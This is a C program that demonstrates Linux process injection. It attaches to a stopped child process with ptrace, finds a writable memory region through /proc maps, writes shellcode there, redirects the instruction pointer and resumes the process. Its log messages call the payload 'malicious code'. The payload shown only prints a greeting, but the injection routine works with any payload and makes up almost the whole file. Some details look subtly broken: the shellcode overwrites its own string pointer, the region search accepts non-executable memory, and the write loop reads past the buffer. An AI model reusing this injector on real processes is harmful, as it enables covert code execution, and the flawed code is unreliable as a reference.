#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <signal.h>
#include <string.h>
#include <errno.h>

// Shellcode to print "Hello, World!" and then exit
char shellcode[] = 
    "\xeb\x1e\x5e\x48\x31\xc0\x48\x89\xc2\x48\x89"
    "\xc6\xb0\x01\xb2\x0e\x0f\x05\x48\x31\xff\x40"
    "\xb7\x01\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xdd"
    "\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x57"
    "\x6f\x72\x6c\x64\x21\x0a";

void inject_code(pid_t pid, void *remote_address, const void *code, size_t size) {
    for (size_t i = 0; i < size; i += sizeof(long)) {
        if (ptrace(PTRACE_POKETEXT, pid, remote_address + i, *(long *)(code + i)) == -1) {
            perror("ptrace poketext");
            exit(EXIT_FAILURE);
        }
    }
}

void* find_writable_executable_memory(pid_t pid) {
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    
    FILE *maps = fopen(maps_path, "r");
    if (!maps) {
        perror("fopen maps");
        exit(EXIT_FAILURE);
    }
    
    char line[256];
    while (fgets(line, sizeof(line), maps)) {
        void *start, *end;
        char perms[5];
        
        if (sscanf(line, "%p-%p %4s", &start, &end, perms) == 3) {
            // Check for a suitable memory region
            if (strstr(perms, "rwx")) {
                fclose(maps);
                return start;
            } else if (strstr(perms, "rw")) {
                // Alternatively, check for a writable region
                fclose(maps);
                return start;
            }
        }
    }
    
    fclose(maps);
    fprintf(stderr, "No suitable memory region found for injection\n");
    exit(EXIT_FAILURE);
}

int main() {
    pid_t pid = fork();
    if (pid == 0) {
        printf("Child process: raising SIGSTOP and executing /bin/ls\n");
        raise(SIGSTOP);  // Pause the process
        execl("/bin/ls", "ls", NULL);  // Replace with legitimate process
        perror("execl failed");  // If execl fails
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process
        int status;
        printf("Parent process: waiting for child process to stop\n");
        waitpid(pid, &status, WUNTRACED);  // Wait for child to stop

        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGSTOP) {
            printf("Parent process: child process stopped by SIGSTOP\n");
        } else {
            printf("Parent process: child process did not stop as expected\n");
            exit(EXIT_FAILURE);
        }

        printf("Parent process: attaching to child process with ptrace\n");
        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
            perror("ptrace attach");
            exit(EXIT_FAILURE);
        }
        waitpid(pid, NULL, 0);

        printf("Parent process: finding writable and executable memory region\n");
        void *base_address = find_writable_executable_memory(pid);
        printf("Parent process: found writable and executable memory region at %p\n", base_address);

        printf("Parent process: injecting malicious code\n");
        inject_code(pid, base_address, shellcode, sizeof(shellcode));

        printf("Parent process: modifying instruction pointer to point to malicious code\n");
        struct user_regs_struct regs;
        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
            perror("ptrace getregs");
            exit(EXIT_FAILURE);
        }
        regs.rip = (unsigned long)base_address;  // Set instruction pointer to the new code
        if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
            perror("ptrace setregs");
            exit(EXIT_FAILURE);
        }

        printf("Parent process: detaching and resuming child process\n");
        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
            perror("ptrace detach");
            exit(EXIT_FAILURE);
        }
        if (kill(pid, SIGCONT) == -1) {
            perror("kill sigcont");
            exit(EXIT_FAILURE);
        }

        printf("Parent process: checking process list for 'ls'\n");
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "ps -p %d -o comm=", pid);
        system(cmd);
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }
    return 0;
}
